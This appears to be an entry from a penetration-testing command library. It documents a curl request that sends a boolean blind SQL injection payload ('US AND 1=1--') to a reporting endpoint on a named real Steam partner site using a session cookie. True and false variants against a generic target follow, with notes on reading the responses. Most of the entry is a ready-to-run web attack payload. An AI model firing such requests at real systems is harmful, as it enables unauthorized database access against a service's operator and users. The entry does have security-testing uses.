---
data: >-
  curl -X POST 'https://partner.steamgames.com/report_xml.php' -H 'Cookie:
  session=your_session' -H 'Content-Type: application/x-www-form-urlencoded' -d
  'countryFilter[]=US AND 1=1--&reportType=1'
tags:
  - sqli
  - blind
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.246Z'
id: 56407a70-02fd-42ae-9bce-9c2342146e42
verified: false
validated: true
submitted: true
---
# curl-boolean-sqli

## Command

```bash
curl -X POST 'https://partner.steamgames.com/report_xml.php' -H 'Cookie: session=your_session' -H 'Content-Type: application/x-www-form-urlencoded' -d 'countryFilter[]=US AND 1=1--&reportType=1'
```

## Description

Sends a boolean-based SQL injection payload to test true conditions in blind SQLi scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d 'countryFilter[]=US AND 1=1--'` | Boolean true payload with comment | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/vuln.php' -d 'param=val AND 1=1--'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/vuln.php' -d 'param=val AND 1=2--' --output false_response.xml
```

## Expected Output

Normal XML response for true; altered for false, indicating injection success.

## Related

- [[commands/curl-test-sqli]]
- [[procedures/Exploiting-Blind-SQL-Injection-in-Country-Filter]]
